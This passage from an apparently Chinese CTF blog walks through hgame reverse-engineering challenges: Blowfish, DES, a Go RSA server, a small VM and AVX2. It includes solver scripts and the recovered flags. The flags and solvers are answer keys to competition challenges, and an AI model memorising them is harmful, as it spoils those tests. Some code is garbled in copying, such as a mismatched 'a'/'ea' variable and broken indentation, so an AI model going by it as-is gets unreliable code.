class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//unsigned int F(PBLOWFISH_CTX blowCtx, unsigned int Data)</span></span><br><span class="line"><span class="comment">//&#123;</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//    unsigned int a, b, c, d;</span></span><br><span class="line"><span class="comment">//    /*</span></span><br><span class="line"><span class="comment">//    利用位运算 取出下标值</span></span><br><span class="line"><span class="comment">//    */</span></span><br><span class="line"><span class="comment">//    </span></span><br><span class="line"><span class="comment">//   a = (Data  &gt;&gt; 24) &amp; 0xFF;</span></span><br><span class="line"><span class="comment">//   b = (Data &gt;&gt; 16) &amp; 0xFF;</span></span><br><span class="line"><span class="comment">//   c = (Data &gt;&gt; 8) &amp; 0xFf;</span></span><br><span class="line"><span class="comment">//   d = Data &amp; 0xFF;</span></span><br><span class="line"><span class="comment">//   </span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//    int TempValue = blowCtx-&gt;sbox[0][a] + blowCtx-&gt;sbox[1][b];</span></span><br><span class="line"><span class="comment">//    TempValue = TempValue ^ blowCtx-&gt;sbox[2][c];</span></span><br><span class="line"><span class="comment">//    TempValue = TempValue + blowCtx-&gt;sbox[3][d];</span></span><br><span class="line"><span class="comment">//    //公式 ((a+b)^c)+d</span></span><br><span class="line"><span class="comment">//    return TempValue;</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="title">F</span><span class="params">(BLOWFISH_CTX* ctx, <span class="keyword">unsigned</span> <span class="keyword">long</span> x)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">short</span> a, b, c, d;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span>  y;</span><br><span class="line"></span><br><span class="line">   <span class="comment">/* d = (unsigned short)(x &amp; 0xFF);</span></span><br><span class="line"><span class="comment">    x &gt;&gt;= 8;</span></span><br><span class="line"><span class="comment">    c = (unsigned short)(x &amp; 0xFF);</span></span><br><span class="line"><span class="comment">    x &gt;&gt;= 8;</span></span><br><span class="line"><span class="comment">    b = (unsigned short)(x &amp; 0xFF);</span></span><br><span class="line"><span class="comment">    x &gt;&gt;= 8;</span></span><br><span class="line"><span class="comment">    a = (unsigned short)(x &amp; 0xFF);</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    //都可以使用</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    a = (x &gt;&gt; <span class="number">24</span>) &amp; <span class="number">0xFF</span>;</span><br><span class="line">    b = (x &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xFF</span>;</span><br><span class="line">    c = (x &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFf</span>;</span><br><span class="line">    d = x &amp; <span class="number">0xFF</span>;</span><br><span class="line">    </span><br><span class="line">    y = ctx-&gt;sbox[<span class="number">0</span>][a] + ctx-&gt;sbox[<span class="number">1</span>][b];</span><br><span class="line">    y = y ^ ctx-&gt;sbox[<span class="number">2</span>][c];</span><br><span class="line">    y = y + ctx-&gt;sbox[<span class="number">3</span>][d];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> y;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">BlowFish_Encry</span><span class="params">(PBLOWFISH_CTX blowCtx, <span class="keyword">unsigned</span> <span class="keyword">int</span>* left, <span class="keyword">unsigned</span> <span class="keyword">int</span>* right)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span>  Xl;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span>  Xr;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span>  temp;</span><br><span class="line">    <span class="keyword">short</span>       i;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//加密部分首先将其分为left跟right两组。 每一组分别32位</span></span><br><span class="line">    Xl = *left;</span><br><span class="line">    Xr = *right;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; N; ++i) &#123;</span><br><span class="line">        Xl = Xl ^ blowCtx-&gt;pbox[i];</span><br><span class="line">        Xr = F(blowCtx, Xl) ^ Xr;</span><br><span class="line"></span><br><span class="line">        temp = Xl;</span><br><span class="line">        Xl = Xr;<span class="comment">//交换左右的值。 l = R r= l 继续下一轮循环。总共16轮</span></span><br><span class="line">        Xr = temp;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    temp = Xl;</span><br><span class="line">    Xl = Xr;                          <span class="comment">//16轮完毕之后交换变量</span></span><br><span class="line">    Xr = temp;</span><br><span class="line"></span><br><span class="line">    Xr = Xr ^ blowCtx-&gt;pbox[N];              <span class="comment">//最后进行一次疑或</span></span><br><span class="line">    Xl = Xl ^ blowCtx-&gt;pbox[N + <span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">    *left = Xl;</span><br><span class="line">    *right = Xr;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">BlowFish_Decrypt</span><span class="params">(PBLOWFISH_CTX blowCtx, <span class="keyword">unsigned</span> <span class="keyword">int</span>* left, <span class="keyword">unsigned</span> <span class="keyword">int</span>* right)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> Xl = *left;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> Xr = *right;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//倒着循环</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = N + <span class="number">1</span>; i &gt; <span class="number">1</span>; --i)</span><br><span class="line">    &#123;</span><br><span class="line">        Xl = Xl ^ blowCtx-&gt;pbox[i];</span><br><span class="line">        Xr = Xr ^ F(blowCtx, Xl);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//继续左右交换</span></span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">int</span> temp = Xl;</span><br><span class="line">        Xl = Xr;</span><br><span class="line">        Xr = temp;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//最后一轮继续交换</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> temp = Xl;</span><br><span class="line">    Xl = Xr;</span><br><span class="line">    Xr = temp;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//返还原</span></span><br><span class="line">    Xr = Xr ^ blowCtx-&gt;pbox[<span class="number">1</span>];</span><br><span class="line">    Xl = Xl ^ blowCtx-&gt;pbox[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">    <span class="comment">//设置变量返回</span></span><br><span class="line">    *left = Xl;</span><br><span class="line">    *right = Xr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> L =<span class="number">0x546F4EBF</span> , R = <span class="number">0xB4ED937B</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> enc[]=&#123;  <span class="number">0xBF</span>, <span class="number">0x4E</span>, <span class="number">0x6F</span>, <span class="number">0x54</span>, <span class="number">0x7B</span>, <span class="number">0x93</span>, <span class="number">0xED</span>, <span class="number">0xB4</span>, <span class="number">0x7E</span>, <span class="number">0xA0</span>, </span><br><span class="line">  <span class="number">0xD2</span>, <span class="number">0x82</span>, <span class="number">0xDD</span>, <span class="number">0xEF</span>, <span class="number">0xD3</span>, <span class="number">0x13</span>, <span class="number">0x0F</span>, <span class="number">0xAE</span>, <span class="number">0x09</span>, <span class="number">0x22</span>, </span><br><span class="line">  <span class="number">0x61</span>, <span class="number">0xDF</span>, <span class="number">0x4E</span>, <span class="number">0x59</span>, <span class="number">0x2C</span>, <span class="number">0x78</span>, <span class="number">0x33</span>, <span class="number">0xB9</span>, <span class="number">0x32</span>, <span class="number">0xE5</span>, </span><br><span class="line">  <span class="number">0x07</span>, <span class="number">0x1C</span>,<span class="number">0x00</span>&#125;;</span><br><span class="line">    BLOWFISH_CTX ctx;</span><br><span class="line">    BlowFishInit(&amp;ctx,(<span class="keyword">unsigned</span> <span class="keyword">char</span>*)<span class="string">&quot;LET_U_D&quot;</span>,<span class="built_in">strlen</span>(<span class="string">&quot;LET_U_D&quot;</span>));</span><br><span class="line">    <span class="comment">//BlowFish_Encry(&amp;ctx, &amp;L, &amp;R);</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">4</span>;i++)</span><br><span class="line">    &#123;</span><br><span class="line">    BlowFish_Decrypt(&amp;ctx, (<span class="keyword">unsigned</span> <span class="keyword">int</span>*)(enc+i*<span class="number">8</span>), (<span class="keyword">unsigned</span> <span class="keyword">int</span>*)(enc+i*<span class="number">8</span>+<span class="number">4</span>));</span><br><span class="line">&#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>,enc);</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//hgame&#123;D0_y0u_re411V_11k3_9Vthon&#125; </span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>后来发现不能运行是因为需要python3.9。这样就可以在ida中打断点调试了，需要把fishman.cp39-win_amd64.pyd放在python3.9的site-packages下。能调试了当然就方便多了。</p><h2 id="week4"><a href="#week4" class="headerlink" title="week4"></a>week4</h2><h3 id="WOW"><a href="#WOW" class="headerlink" title="WOW"></a>WOW</h3><p>考点des加密，设计的比较巧妙，des应该是魔改过的，而且表都没魔改过，但是估计修改了加密逻辑。</p><p>题目设置了text节区可写是有原因的，里面有两个函数会修改text节区的代码，然后正好后面有个这个des的自解密，但是text的代码被修改后，就执行不到后面的自解密函数了。所以需要绕一下。<br><img src="https://s2.loli.net/2022/02/24/pbyshZ1WLwSvkr2.png"></p><p>动调解密即可。</p><h3 id="server"><a href="#server" class="headerlink" title="server"></a>server</h3><p>之前写过tcp最基本的tcp通讯，所以还是没什么难度。</p><p>go语言逆向，可以看出是一个服务器，之前一直在找输入的地方，后来分析了一些函数，发现是个http服务器，并且通过get方式传参，没尝试过post行不行。</p><p>可以看到main，main函数，先是在本地创建了个9090的监听端口。<br><img src="https://s2.loli.net/2022/02/24/gy3AKdRePOG7Uvh.png"><br>然后重点看http处理函数。先是提取出请求参数flag的值，然后加密，然后比较。<br><img src="https://s2.loli.net/2022/02/24/N4U1eiS7sx2EG5l.png"><br>然后就是rsa的加密了，主要是使用了bigmath，处理大数，<a href="https://studygolang.com/articles/20366">https://studygolang.com/articles/20366</a>，然后最后有两轮数组内异或。反解需要爆破第二轮异或的值。</p><p>rsa的p，q，e，均可调试得到，而且在看数据时最好看汇编界面，因为f5出来的效果不是太好，注意p，q传入的math_big___ptr_Int__SetString长度。<br><img src="https://s2.loli.net/2022/02/24/xTCWtkqgi7GeZrF.png"></p><p>脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">table = [<span class="number">0</span>] * <span class="number">153</span></span><br><span class="line">a=<span class="number">0x30</span></span><br><span class="line"><span class="keyword">for</span> t <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x30</span>, <span class="number">0x45</span>):</span><br><span class="line">    a = t</span><br><span class="line">    enc = [<span class="number">99</span>, <span class="number">85</span>, <span class="number">4</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">3</span>, <span class="number">7</span>, <span class="number">7</span>, <span class="number">2</span>, <span class="number">8</span>, <span class="number">8</span>, <span class="number">11</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">10</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">13</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">12</span>, <span class="number">9</span>, <span class="number">4</span>, <span class="number">13</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">14</span>, <span class="number">0</span>, <span class="number">15</span>, <span class="number">13</span>, <span class="number">14</span>,</span><br><span class="line">           <span class="number">10</span>,</span><br><span class="line">           <span class="number">2</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">7</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">6</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">5</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">9</span>, <span class="number">6</span>, <span class="number">0</span>, <span class="number">11</span>, <span class="number">13</span>, <span class="number">11</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">8</span>, <span class="number">3</span>, <span class="number">11</span>, <span class="number">7</span>, <span class="number">1</span>, <span class="number">11</span>, <span class="number">5</span>, <span class="number">14</span>, <span class="number">5</span>,</span><br><span class="line">           <span class="number">0</span>,</span><br><span class="line">           <span class="number">10</span>, <span class="number">14</span>, <span class="number">15</span>, <span class="number">13</span>, <span class="number">7</span>, <span class="number">13</span>, <span class="number">7</span>, <span class="number">14</span>, <span class="number">1</span>, <span class="number">15</span>, <span class="number">1</span>, <span class="number">11</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">2</span>, <span class="number">12</span>, <span class="number">6</span>, <span class="number">10</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">7</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">6</span>, <span class="number">3</span>, <span class="number">6</span>, <span class="number">12</span>, <span class="number">5</span>, <span class="number">12</span>, <span class="number">3</span>, <span class="number">12</span>, <span class="number">6</span>,</span><br><span class="line">           <span class="number">0</span>,</span><br><span class="line">           <span class="number">4</span>, <span class="number">15</span>, <span class="number">2</span>, <span class="number">14</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">14</span>, <span class="number">14</span>, <span class="number">12</span>, <span class="number">4</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">6</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">6</span>, <span class="number">4</span>, <span class="number">4</span>, <span class="number">4</span>, <span class="number">7</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">9</span>, <span class="number">2</span>, <span class="number">12</span>, <span class="number">8</span>, <span class="number">1</span>, <span class="number">12</span>, <span class="number">3</span>,</span><br><span class="line">           <span class="number">12</span>,</span><br><span class="line">           <span class="number">2</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">14</span>, <span class="number">3</span>, <span class="number">14</span>, <span class="number">12</span>, <span class="number">9</span>, <span class="number">1</span>, <span class="number">7</span>, <span class="number">15</span>, <span class="number">5</span>, <span class="number">7</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">4</span>]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">153</span>):</span><br><span class="line">        enc[i] = a ^ enc[i]</span><br><span class="line">        a = enc[i]</span><br><span class="line">    a = <span class="number">0x66</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">153</span>):</span><br><span class="line">        enc[i] = enc[i] ^ a</span><br><span class="line">        a = enc[i]</span><br><span class="line">    print(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> enc:</span><br><span class="line">        print(<span class="built_in">chr</span>(i), end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">print(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#flag1=&#x27;135005562109829034199059149474896341566307600227148289525068532297727897409776873250963225670468340868270979975367474527115512003915945795967599087720024&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#flag2=&#x27;034015463119928024098049048464997351467317701237049299424078433287626887508766972240862235771478241878371969874377575537014502102905844785866589186730125&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Decrypt</span>(<span class="params">c, e, p, q</span>):</span></span><br><span class="line">    L = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">    d = gmpy2.invert(e, L)</span><br><span class="line">    n = p * q</span><br><span class="line">    m = gmpy2.powmod(c, d, n)</span><br><span class="line">    print(long_to_bytes(m))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    p = <span class="number">107310528658039985708896636559112400334262005367649176746429531274300859498993</span></span><br><span class="line">    q = <span class="number">92582184765240663364795767694262273105045150785272129481762171937885924776597</span></span><br><span class="line">    e = <span class="number">950501</span></span><br><span class="line">    c = <span class="number">135005562109829034199059149474896341566307600227148289525068532297727897409776873250963225670468340868270979975367474527115512003915945795967599087720024</span></span><br><span class="line">    Decrypt(c, e, p, q)</span><br><span class="line"></span><br><span class="line"><span class="comment">#https://studygolang.com/articles/20366</span></span><br></pre></td></tr></table></figure><h3 id="ezvm"><a href="#ezvm" class="headerlink" title="ezvm"></a>ezvm</h3><p>vm虚拟机，调试就行，看完所有函数，发现就两个地方设计到计算，sub_40178C和sub_40177D。</p><p>调试发现，开始都是将输入的flag读取到vm结构体的后面，然后就开始单字节计算，在上面两个函数打个断点，发现是先进行sub_40177D的*2，在进行sub_40178C的异或，异或的数据和密文可以在vm结构体的下面找到，然后简单测试下hgame字符串，完全符合。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">xor=[<span class="number">0x0000005E</span>, <span class="number">0x00000046</span>, <span class="number">0x00000061</span>, <span class="number">0x00000043</span>, <span class="number">0x0000000E</span>, <span class="number">0x00000053</span>, <span class="number">0x00000049</span>, <span class="number">0x0000001F</span>,</span><br><span class="line">    <span class="number">0x00000051</span>, <span class="number">0x0000005E</span>, <span class="number">0x00000036</span>, <span class="number">0x00000037</span>, <span class="number">0x00000029</span>, <span class="number">0x00000041</span>, <span class="number">0x00000063</span>, <span class="number">0x0000003B</span>,</span><br><span class="line">    <span class="number">0x00000064</span>, <span class="number">0x0000003B</span>, <span class="number">0x00000015</span>, <span class="number">0x00000018</span>, <span class="number">0x0000005B</span>, <span class="number">0x0000003E</span>, <span class="number">0x00000022</span>, <span class="number">0x00000050</span>,</span><br><span class="line">    <span class="number">0x00000046</span>, <span class="number">0x0000005E</span>, <span class="number">0x00000035</span>, <span class="number">0x0000004E</span>, <span class="number">0x00000043</span>, <span class="number">0x00000023</span>, <span class="number">0x00000060</span>, <span class="number">0x0000003B</span>,</span><br><span class="line">    <span class="number">0x00000000</span>, <span class="number">0xFFFFFFEF</span>, <span class="number">0x00000015</span>]</span><br><span class="line">enc= [<span class="number">0x0000008E</span>, <span class="number">0x00000088</span>, <span class="number">0x000000A3</span>, <span class="number">0x00000099</span>, <span class="number">0x000000C4</span>,</span><br><span class="line">    <span class="number">0x000000A5</span>, <span class="number">0x000000C3</span>, <span class="number">0x000000DD</span>, <span class="number">0x00000019</span>, <span class="number">0x000000EC</span>, <span class="number">0x0000006C</span>, <span class="number">0x0000009B</span>, <span class="number">0x000000F3</span>,</span><br><span class="line">    <span class="number">0x0000001B</span>, <span class="number">0x0000008B</span>, <span class="number">0x0000005B</span>, <span class="number">0x0000003E</span>, <span class="number">0x0000009B</span>, <span class="number">0x000000F1</span>, <span class="number">0x00000086</span>, <span class="number">0x000000F3</span>,</span><br><span class="line">    <span class="number">0x000000F4</span>, <span class="number">0x000000A4</span>, <span class="number">0x000000F8</span>, <span class="number">0x000000F8</span>, <span class="number">0x00000098</span>, <span class="number">0x000000AB</span>, <span class="number">0x00000086</span>, <span class="number">0x00000089</span>,</span><br><span class="line">    <span class="number">0x00000061</span>, <span class="number">0x00000022</span>, <span class="number">0x000000C1</span>, <span class="number">0x00000002</span>, <span class="number">0x00000000</span>, <span class="number">0xFFFFFFFA</span>, <span class="number">0x00000073</span>, <span class="number">0x00000075</span>,</span><br><span class="line">    <span class="number">0x00000063</span>, <span class="number">0x00000063</span>, <span class="number">0x00000065</span>, <span class="number">0x00000073</span>, <span class="number">0x00000073</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">  <span class="keyword">for</span> f <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">127</span>):</span><br><span class="line">    <span class="keyword">if</span>((f*<span class="number">2</span>)^xor[i]==enc[i]):</span><br><span class="line">      print(<span class="built_in">chr</span>(f),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="comment">#hgame&#123;Ea$Y-Vm-t0-PrOTeCT_cOde!</span></span><br><span class="line">!&#125;</span><br></pre></td></tr></table></figure><h3 id="hardasm"><a href="#hardasm" class="headerlink" title="hardasm"></a>hardasm</h3><p>考点AVX2 指令集，之前长安杯也遇到过，当时是0解来着，也没wp样，实际上类似的题也在N1CTF有过，只不过不太一样。如果按流程看，也太头大了，主要就是熟悉指令，<a href="https://www.intel.com/content/www/us/en/docs/intrinsics-guide/index.html">https://www.intel.com/content/www/us/en/docs/intrinsics-guide/index.html</a></p><p>直接贴个官方wp吧，说不定以后用的到</p><p>记录加密指令的个数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">a = <span class="number">0x140001081</span>  <span class="comment"># 起始地址</span></span><br><span class="line">opcode = <span class="built_in">set</span>()  <span class="comment"># 利用集合自动去重</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">if</span> ea &gt;= <span class="number">0x0140007F17</span>:</span><br><span class="line">    <span class="keyword">break</span></span><br><span class="line">opcode.add(print_insn_mnem(ea))</span><br><span class="line">ea = next_head(ea)  <span class="comment"># 到达下个指令的地址</span></span><br><span class="line">print(opcode)</span><br><span class="line"><span class="comment"># &#123;&#x27;vpsubb&#x27;, &#x27;vpermd&#x27;, &#x27;vpshufb&#x27;, &#x27;vpaddb&#x27;, &#x27;vpxor&#x27;&#125;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>解密</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> numpy</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">vpaddb</span>(<span class="params">a, b</span>):</span></span><br><span class="line">    <span class="keyword">global</span> num</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">        num[a][i] += num[b][i]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">vpsubb</span>(<span class="params">a, b</span>):</span></span><br><span class="line">    <span class="keyword">global</span> num</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">        num[a][i] -= num[b][i]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">vpxor</span>(<span class="params">a, b</span>):</span></span><br><span class="line">    <span class="keyword">global</span> num</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">        num[a][i] ^= num[b][i]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">vpshufb</span>(<span class="params">a, b</span>):</span></span><br><span class="line">    <span class="keyword">global</span> num</span><br><span class="line"></span><br><span class="line">    c = [<span class="number">0</span>] * <span class="number">32</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">        <span class="keyword">if</span> num[b][i] &amp; <span class="number">0x80</span>:</span><br><span class="line">            c[i] = <span class="number">0</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        c[i] = num[a][num[b][i] &amp; <span class="number">0xF</span>]</span><br><span class="line">    <span class="keyword">if</span> num[b][i + <span class="number">16</span>] &amp; <span class="number">0x80</span>:</span><br><span class="line">        